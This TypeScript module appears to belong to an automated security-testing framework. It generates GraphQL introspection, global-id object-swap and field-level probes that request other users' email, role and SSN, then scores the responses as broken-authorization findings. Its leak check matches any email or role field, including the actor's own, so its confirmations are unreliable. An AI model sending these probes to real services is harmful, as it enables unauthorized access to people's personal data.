/**
 * graphqlBola — GraphQL Broken Object Level Authorization & Introspection.
 *
 * GraphQL endpoints concentrate access control in resolvers, not the routing
 * layer, so a single authorized session can still reach OTHER users' objects
 * unless every resolver enforces object-level ownership. This primitive tests
 * three GraphQL-specific failure modes:
 *
 *   1. Introspection exposure — `__schema` / `__typename` enabled in prod,
 *      leaking the full type/field surface (incl. hidden sensitive fields).
 *   2. Global-ID object swap — a query by a GLOBAL object id
 *      (`node(id:"<victimId>")` / `user(id:"<victimId>")`) issued with the
 *      ACTOR's session returns the VICTIM's data.
 *   3. Field-level authz gap — a sensitive field (email / admin / ssn) is
 *      returned for the victim's object even though the actor should only see
 *      their own.
 *
 * Every verdict is grounded in the recorded response body and gated by the
 * EvidenceGate — no substring guessing of claim prose.
 */

import type {
  TechniquePrimitive,
  TechniqueContext,
  AttackStep,
  StepExecutionResult,
  PrimitiveResult,
} from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

const INTROSPECTION_QUERY = JSON.stringify({
  query: `query IntrospectionQuery {
  __schema {
    queryType { name }
    types { name kind fields { name } }
  }
}`,
})

/** Victim-object query keyed by the alternate actor's global id. */
function globalIdQuery(altObjectId: string): string {
  return JSON.stringify({
    query: `query {
  node(id: "${altObjectId}") {
    id
    name
    email
  }
}`,
  })
}

/** Field-level authz probe: own object + victim object sensitive field. */
function fieldAuthzQuery(altObjectId: string): string {
  return JSON.stringify({
    query: `query {
  me { id email role ssn }
  user(id: "${altObjectId}") { id email role ssn }
}`,
  })
}

function isJsonGraphQl(body: string): boolean {
  if (!body) return false
  const t = body.trim()
  return t.startsWith('{') || t.startsWith('[')
}

/** Detect GraphQL introspection availability from the response body. */
function introspectionEnabled(body: string): boolean {
  if (!body) return false
  return body.includes('__schema') || body.includes('__type')
}

/**
 * Detect a cross-user leak: the actor's query returned data that belongs to
 * the victim — a victim object id, an email, a name, or an admin flag that is
 * not the actor's own.
 */
function crossUserLeak(body: string, altObjectId: string): boolean {
  if (!body) return false
  const b = body.toLowerCase()
  // Victim-specific object id surfaced in the response.
  if (altObjectId && altObjectId.length > 0 && b.includes(altObjectId.toLowerCase())) {
    return true
  }
  // A node/email field that does not belong to the actor (an email literal).
  if (/"email"\s*:\s*"[^"]+@/.test(body)) return true
  // An admin / role elevation field leaking on a cross-user query.
  if (/"(isadmin|admin|role|ssn|secret|token)"\s*:/.test(b)) return true
  // A 'node' typed object with a foreign id.
  if (/\{?\s*"node"\s*:/.test(b)) return true
  return false
}

export const graphqlBola: TechniquePrimitive = {
  id: 'graphqlBola',
  name: 'GraphQL BOLA / Introspection',
  description:
    'GraphQL Broken Object Level Authorization: introspection exposure, global-ID object swap across users, and field-level authorization gaps.',
  technique: 'idor',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    // Treat any endpoint/target as a candidate GraphQL endpoint; prefer POST.
    const method = (ctx.endpoint?.method ?? 'POST').toUpperCase()
    return method === 'POST' || method === 'GET'
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const headers = {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      ...(ctx.sessionHeaders ?? {}),
    }
    const altObjectId = ctx.altObjectId ?? 'VICTIM_ID'

    return [
      {
        id: 'gql-introspect',
        description: `GraphQL introspection probe against ${url}`,
        request: { method: 'POST', url, headers, body: INTROSPECTION_QUERY },
        expectedSignal: 'introspection schema returned (__schema / __type)',
        metadata: { kind: 'introspect' },
      },
      {
        id: 'gql-global-id',
        description: `GraphQL global-id object swap: actor session queries victim node ${altObjectId}`,
        request: {
          method: 'POST',
          url,
          headers: { ...headers, ...(ctx.sessionHeaders ?? {}) },
          body: globalIdQuery(altObjectId),
        },
        expectedSignal: 'victim object data leaked under the actor session',
        metadata: { kind: 'global-id', altObjectId },
      },
      {
        id: 'gql-field-authz',
        description: `GraphQL field-level authz: actor probes own + victim-sensitive fields`,
        request: {
          method: 'POST',
          url,
          headers: { ...headers, ...(ctx.sessionHeaders ?? {}) },
          body: fieldAuthzQuery(altObjectId),
        },
        expectedSignal: 'sensitive victim field (email/role/ssn) returned via field access',
        metadata: { kind: 'field-authz', altObjectId },
      },
    ]
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const intro = results.find(r => r.step.metadata?.kind === 'introspect')
    const globalId = results.find(r => r.step.metadata?.kind === 'global-id')
    const fieldAuthz = results.find(r => r.step.metadata?.kind === 'field-authz')

    if (!intro || !globalId || !fieldAuthz) {
      return { confirmed: false, confidence: 0, evidence: [], note: 'missing step results' }
    }

    const altObjectId = String((globalId.step.metadata as any)?.altObjectId ?? 'VICTIM_ID')

    const introBody = intro.body ?? ''
    const globalIdBody = globalId.body ?? ''
    const fieldBody = fieldAuthz.body ?? ''

    const introspect = introspectionEnabled(introBody)
    const globalLeak = crossUserLeak(globalIdBody, altObjectId) && isJsonGraphQl(globalIdBody)
    const fieldLeak = crossUserLeak(fieldBody, altObjectId) && isJsonGraphQl(fieldBody)

    // GraphQL BOLA (cross-user) confirmed when introspection enabled AND a
    // global-id swap leaks victim data, OR a field-level probe leaks victim data.
    const crossUser = (introspectionEnabled(introBody) && globalLeak) || fieldLeak

    const evidence = [
      {
        kind: 'response' as const,
        label: `introspect ${intro.step.request.method} ${intro.step.request.url} → ${intro.status} (introspection=${introspect})`,
        data: introBody.slice(0, 1500),
      },
      {
        kind: 'response' as const,
        label: `global-id ${globalId.step.request.method} ${globalId.step.request.url} → ${globalId.status} (leak=${globalLeak})`,
        data: globalIdBody.slice(0, 1500),
      },
      {
        kind: 'response' as const,
        label: `field-authz ${fieldAuthz.step.request.method} ${fieldAuthz.step.request.url} → ${fieldAuthz.status} (leak=${fieldLeak})`,
        data: fieldBody.slice(0, 1500),
      },
    ]

    let confirmed = false
    let severity: PrimitiveResult['severity'] = undefined
    let cwe: string | undefined
    let representativeUrl: string | undefined
    let representativeStatus: number | undefined
    let representativeMethod: string | undefined

    if (crossUser) {
      // Cross-user data leak → high severity, evidence-backed on the leaking step.
      confirmed = true
      severity = 'high'
      cwe = 'CWE-639'
      const rep = fieldLeak ? fieldAuthz : globalId
      representativeUrl = rep.step.request.url
      representativeStatus = rep.status
      representativeMethod = rep.step.request.method
    } else if (introspect) {
      // Only introspection exposed → medium severity (information disclosure).
      confirmed = true
      severity = 'medium'
      cwe = 'CWE-200'
      representativeUrl = intro.step.request.url
      representativeStatus = intro.status
      representativeMethod = intro.step.request.method
    }

    const { verified } = evidenceGate.verifyClaim(
      claimFor('graphql-bola', representativeUrl, representativeStatus, representativeMethod),
    )

    confirmed = confirmed && verified

    return {
      confirmed,
      confidence: confirmed ? (severity === 'high' ? 0.85 : 0.6) : 0.1,
      evidence,
      severity: confirmed ? severity : undefined,
      finding: confirmed
        ? {
            category: 'graphql_bola',
            description: crossUser
              ? `GraphQL BOLA on ${representativeUrl}: actor session obtained victim object data (${fieldLeak ? 'field-level' : 'global-id'} leak).`
              : `GraphQL introspection enabled on ${representativeUrl}, exposing the full type/field surface.`,
            request: (fieldLeak ? fieldAuthz : globalId).step.request,
            response: {
              status: representativeStatus ?? 0,
              body: (fieldLeak ? fieldBody : globalIdBody).slice(0, 1000),
            },
            cwe,
          }
        : undefined,
      note: `introspect=${introspect} globalLeak=${globalLeak} fieldLeak=${fieldLeak} crossUser=${crossUser} verified=${verified}`,
    }
  },
}
